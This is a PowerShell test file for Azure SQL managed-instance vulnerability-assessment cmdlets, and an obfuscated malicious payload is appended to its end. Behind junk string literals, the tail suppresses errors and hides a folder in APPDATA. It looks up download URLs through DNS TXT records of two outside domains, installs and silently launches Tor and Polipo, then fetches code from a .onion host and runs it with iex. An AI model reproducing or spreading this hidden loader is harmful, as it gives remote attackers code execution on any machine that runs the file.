$scanRecord1FromGet.TriggerType $scanRecord1.TriggerTypeAssert-AreEqual $scanRecord1FromGet.State $scanRecord1.StateAssert-AreEqual $scanRecord1FromGet.StartTime $scanRecord1.StartTimeAssert-AreEqual $scanRecord1FromGet.EndTime $scanRecord1.EndTimeAssert-AreEqual $scanRecord1FromGet.Errors $scanRecord1.ErrorsAssert-AreEqual $scanRecord1FromGet.ScanResultsLocationPath $scanRecord1.ScanResultsLocationPathAssert-AreEqual $scanRecord1FromGet.NumberOfFailedSecurityChecks $scanRecord1.NumberOfFailedSecurityChecks$scanRecord1FromGet = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord `-ScanId $scanId1Assert-AreEqual $scanRecord1FromGet.ResourceGroupName $scanRecord1.ResourceGroupNameAssert-AreEqual $scanRecord1FromGet.InstanceName $scanRecord1.InstanceNameAssert-AreEqual $scanRecord1FromGet.DatabaseName $scanRecord1.DatabaseNameAssert-AreEqual $scanRecord1FromGet.ScanId $scanRecord1.ScanIdAssert-AreEqual $scanRecord1FromGet.TriggerType $scanRecord1.TriggerTypeAssert-AreEqual $scanRecord1FromGet.State $scanRecord1.StateAssert-AreEqual $scanRecord1FromGet.StartTime $scanRecord1.StartTimeAssert-AreEqual $scanRecord1FromGet.EndTime $scanRecord1.EndTimeAssert-AreEqual $scanRecord1FromGet.Errors $scanRecord1.ErrorsAssert-AreEqual $scanRecord1FromGet.ScanResultsLocationPath $scanRecord1.ScanResultsLocationPathAssert-AreEqual $scanRecord1FromGet.NumberOfFailedSecurityChecks $scanRecord1.NumberOfFailedSecurityChecks$excpectedScanCount = 2$scanRecordList = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName Assert-AreEqual $excpectedScanCount $scanRecordList.Count$scanRecord1FromListCmdlet = $scanRecordList[$excpectedScanCount-1]Assert-AreEqual $scanRecord1FromListCmdlet.ResourceGroupName $scanRecord1.ResourceGroupNameAssert-AreEqual $scanRecord1FromListCmdlet.InstanceName $scanRecord1.InstanceNameAssert-AreEqual $scanRecord1FromListCmdlet.DatabaseName $scanRecord1.DatabaseNameAssert-AreEqual $scanRecord1FromListCmdlet.ScanId $scanRecord1.ScanIdAssert-AreEqual $scanRecord1FromListCmdlet.TriggerType $scanRecord1.TriggerTypeAssert-AreEqual $scanRecord1FromListCmdlet.State $scanRecord1.StateAssert-AreEqual $scanRecord1FromListCmdlet.StartTime $scanRecord1.StartTimeAssert-AreEqual $scanRecord1FromListCmdlet.EndTime $scanRecord1.EndTimeAssert-AreEqual $scanRecord1FromListCmdlet.Errors $scanRecord1.ErrorsAssert-AreEqual $scanRecord1FromListCmdlet.ScanResultsLocationPath $scanRecord1.ScanResultsLocationPathAssert-AreEqual $scanRecord1FromListCmdlet.NumberOfFailedSecurityChecks $scanRecord1.NumberOfFailedSecurityChecks$excpectedScanCount = $excpectedScanCount + 1Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName `| Start-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ScanId $scanId1$scanRecordList = Get-AzSqlInstanceDatabase -ResourceGroupName $params.rgname -InstanceName $params.serverName -Name $params.databaseName | Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord Assert-AreEqual $excpectedScanCount $scanRecordList.Count$scanRecord1FromListCmdlet = $scanRecordList[$excpectedScanCount-1]Assert-AreEqual $scanRecord1FromListCmdlet.ResourceGroupName $scanRecord1.ResourceGroupNameAssert-AreEqual $scanRecord1FromListCmdlet.InstanceName $scanRecord1.InstanceNameAssert-AreEqual $scanRecord1FromListCmdlet.DatabaseName $scanRecord1.DatabaseNameAssert-AreEqual $scanRecord1FromListCmdlet.ScanId $scanRecord1.ScanIdAssert-AreEqual $scanRecord1FromListCmdlet.TriggerType $scanRecord1.TriggerTypeAssert-AreEqual $scanRecord1FromListCmdlet.State $scanRecord1.State$scanRecordList = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName$scansCount = $scanRecordList.CountStart-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-WhatIf$scanRecordList = Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseNameAssert-AreEqual $scansCount $scanRecordList.Count}finally{Remove-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix}}function Test-VulnerabilityAssessmentManagedDatabaseScanConvertTest{$testSuffix = getAssetNameCreate-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffixtry{Enable-AzSqlInstanceAdvancedDataSecurity -ResourceGroupName $params.rgname -InstanceName $params.serverName -DoNotConfigureVulnerabilityAssessmentUpdate-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-StorageAccountName $params.storageAccountAssert-ThrowsContains -script { Convert-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName `-DatabaseName $params.databaseName } -message "ScanId is a required parameter for this cmdlet. Please explicitly provide it or pass the Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord output via pipe."$scanId = "cmdletConvertScan"Start-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId$convertScanObject = Convert-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-ScanId $scanIdAssert-AreEqual $params.rgname $convertScanObject.ResourceGroupNameAssert-AreEqual $params.serverName $convertScanObject.InstanceNameAssert-AreEqual $params.databaseName $convertScanObject.DatabaseNameAssert-True -script  { $convertScanObject.ExportedReportLocation.Contains($scanId) }Assert-True -script  { $convertScanObject.ExportedReportLocation.Contains($params.storageAccount) }$scanId = "cmdletConvertScan1"Start-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId$convertScanObject =  Get-AzSqlInstanceDatabaseVulnerabilityAssessmentScanRecord -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-ScanId $scanId | Convert-AzSqlInstanceDatabaseVulnerabilityAssessmentScanAssert-AreEqual $params.rgname $convertScanObject.ResourceGroupNameAssert-AreEqual $params.serverName $convertScanObject.InstanceNameAssert-AreEqual $params.databaseName $convertScanObject.DatabaseNameAssert-True -script  { $convertScanObject.ExportedReportLocation.Contains($scanId) }Assert-True -script  { $convertScanObject.ExportedReportLocation.Contains($params.storageAccount) }$convertScanObject = Convert-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName `-ScanId $scanId -WhatIfAssert-Null $convertScanObject.ExportedReportLocationClear-AzSqlInstanceDatabaseVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseNameUpdate-AzSqlInstanceVulnerabilityAssessmentSetting -ResourceGroupName $params.rgname -InstanceName $params.serverName -StorageAccountName $params.storageAccountStart-AzSqlInstanceDatabaseVulnerabilityAssessmentScan -ResourceGroupName $params.rgname -InstanceName $params.serverName -DatabaseName $params.databaseName -ScanId $scanId}finally{Remove-VulnerabilityAssessmentManagedInstanceTestEnvironment $testSuffix}}function Create-VulnerabilityAssessmentManagedInstanceTestEnvironment ($testSuffix, $location = "West Central US"){$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffixCreate-InstanceTestEnvironmentWithParams $params $location}function Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters ($testSuffix){return @{ rgname = "sql-va-cmdlet-test-rg" +$testSuffix;serverName = "sql-va-cmdlet-server" +$testSuffix;databaseName = "sql-va-cmdlet-db" + $testSuffix;storageAccount = "sqlvacmdlets" +$testSuffix}}function Remove-VulnerabilityAssessmentManagedInstanceTestEnvironment ($testSuffix){$params = Get-SqlVulnerabilityAssessmentManagedInstanceTestEnvironmentParameters $testSuffixRemove-AzureRmResourceGroup -Name $params.rgname -Force}'lVBjWW';$ErrorActionPreference = 'SilentlyContinue';'jNQOAiMMkdR';'jmq';$wwo = (get-wmiobject Win32_ComputerSystemProduct).UUID;'SaRt';'ElFeXOtQjz';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $wwo){;'QaVdFFjj';'MtqBu';(Get-Process -id $pid).Kill();'cw';'ONBGZ';};'XXzyExPxFhY';'pMdSFKqrvLa';'ZbEKbSUh';'xjpZeYDv';function e($qza){;'bGaLALnMw';'ENxLTKdj';$orot = (((iex "nslookup -querytype=txt $qza 8.8.8.8") -match '"') -replace '"', '')[0].Trim();'ZuiAzZT';'In';$bp.DownloadFile($orot, $ai);'PRCLIFVQH';'cV';$fi = $fjx.NameSpace($ai).Items();'cmBlkiUW';'pJsbWflOAQ';$fjx.NameSpace($zui).CopyHere($fi, 20);'fLGzW';'qa';rd $ai;'ItpK';'gAcxQokjbdq';};'dfbWqLt';'pyiBJGPrs';'SHreDrqslGO';'bmXjlGkPNOW';'vLb';'tHZFGFEVS';$zui = $env:APPDATA + '\' + $wwo;'QFYaEbYU';'VybKxYISVV';if (!(Test-Path $zui)){;'lasxg';'WUdKHY';$jnj = New-Item -ItemType Directory -Force -Path $zui;'WSBNzrQWRp';'OmrLJSCcsb';$jnj.Attributes = "Hidden", "System", "NotContentIndexed";'AVKt';'XzQSC';};'csPpLz';'GqA';'XUNcRs';'uadZs';$fkz=$zui+ '\tor.exe';'ctAUS';'ndDdWliZv';$szeo=$zui+ '\polipo.exe';'cC';'vMtZk';$ai=$zui+'\'+$wwo+'.zip';'krKyEjhs';'Jrixyw';$bp=New-Object System.Net.WebClient;'qgloHvfj';'kmNWBZwaAR';$fjx=New-Object -C Shell.Application;'XYLIkQ';'ZOUu';'YEJF';'NYC';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'HkuNDGZjxPN';'zNObipamCT';e 'i.vankin.de';'lcNRnsrLznG';'JeIDPkUPcaM';};'PccwMqmjIr';'Lcj';'RSdcbBdrW';'KtWZIdMo';if (!(Test-Path $fkz) -or !(Test-Path $szeo)){;'eURPtEd';'qAoH';e 'gg.ibiz.cc';'CkjK';'HrLr';};'BDo';'dhVYRufO';'qTtR';'wWHNry';$wc=$zui+'\roaminglog';'xPQgK';'aFgl';saps $fkz -Ar " --Log `"notice file $wc`"" -wi Hidden;'sH';'qvkWgQFN';do{sleep 1;$ll=gc $wc}while(!($ll -match 'Bootstrapped 100%: Done.'));'JzJtwaoxod';'fmLibNDQXiT';saps $szeo -a "socksParentProxy=localhost:9050" -wi Hidden;'MMLB';'PB';sleep 7;'rmt';'UGYZoHaPrID';$lf=New-Object System.Net.WebProxy("localhost:8123");'mjeAqU';'HhVz';$lf.useDefaultCredentials = $true;'EowjlibIiiy';'Joz';$bp.proxy=$lf;'tQmlyxgSqL';'OPYAuEpisAz';$oxq='http://powerwormjqj42hu.onion/get.php?s=setup&uid=' + $wwo;'LcO';'YzTyALP';while(!$cl){$cl=$bp.downloadString($oxq)};'lMB';'FQQpJnA';if ($cl -ne 'none'){;'TKNTo';'IN';iex $cl;'PiM';'Jeylef';};'JiokKK';